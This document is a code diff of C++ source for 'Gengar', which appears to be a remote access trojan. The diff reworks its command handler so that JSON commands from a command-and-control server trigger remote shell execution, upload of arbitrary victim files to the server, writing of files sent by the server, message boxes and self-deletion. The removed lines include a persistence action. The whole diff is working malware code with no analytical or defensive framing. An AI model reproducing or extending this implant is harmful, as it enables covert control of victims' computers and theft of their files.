@@ -1,35 +1,14 @@
 #include "gengar.h"
 
-bool IsEqual(std::string str1, std::string str2)
-{
-	size_t len1 = str1.length();
-	size_t len2 = str2.length();
-
-	if (len1 > len2)
-		return str1.substr(0, len2) == str2;
-	else
-		return str2.substr(0, len1) == str1;
-}
+void Gengar::ConnectToCnc() { m_client.Connect(); }
 
 void Gengar::ListenForCommand()
 {
-	char type_content_delimiter = ':';
-
 	while (true)
 	{
 		try
 		{
-			std::string input = m_client.Receive();
-			size_t delimiter_index = input.find(type_content_delimiter);
-
-			if (delimiter_index == std::string::npos)
-				m_client.Send("Invalid command.");
-			else
-			{
-				std::string type = input.substr(0, delimiter_index);
-				std::string content = input.substr(delimiter_index + 1, std::string::npos);
-				RouteCommand(type, content);
-			}
+			RouteCommand(m_client.Receive());
 		}
 		catch (boost::system::system_error&)
 		{
@@ -39,28 +18,28 @@ void Gengar::ListenForCommand()
 	}
 }
 
-void Gengar::RouteCommand(std::string& type, std::string& content)
+void Gengar::RouteCommand(json cmd)
 {
-	std::string output;
-
-	if (type == "shell")
-		output = m_machine.RunShellCommand(std::move(content));
-	else if (type == "action")
-	{
-		if (IsEqual(content, "persist"))
-		{
-			m_machine.Persist();
-			output = "Gengar is now persistent.";
-		}
-		else if (IsEqual(content, "suicide"))
-			m_machine.Suicide();
-	}
+	if (cmd["cmd"] == "shell")
+		m_client.Send(m_machine.RunShellCommand(cmd["content"]));
+	else if (cmd["cmd"] == "msgbox")
+		m_machine.ShowMessageBox(cmd["title"], cmd["content"]);
+	else if (cmd["cmd"] == "download")
+		UploadFileToCNC(cmd["path"]);
+	else if (cmd["cmd"] == "upload")
+		DownloadFileFromCNC(cmd["data"], cmd["path"]);
+	else if (cmd["cmd"] == "suicide")
+		m_machine.Suicide();
 	else
-		output = "Unknown command type.";
-	m_client.Send(std::move(output));
+		m_client.Send("Unknown command.");
 }
 
-void Gengar::ConnectToCnc()
+void Gengar::UploadFileToCNC(std::string path)
 {
-	m_client.Connect();
+	m_client.Send(m_machine.ReadFile(path));
+}
+
+void Gengar::DownloadFileFromCNC(std::string data, std::string path)
+{
+	m_machine.WriteFile(data, path);
 }
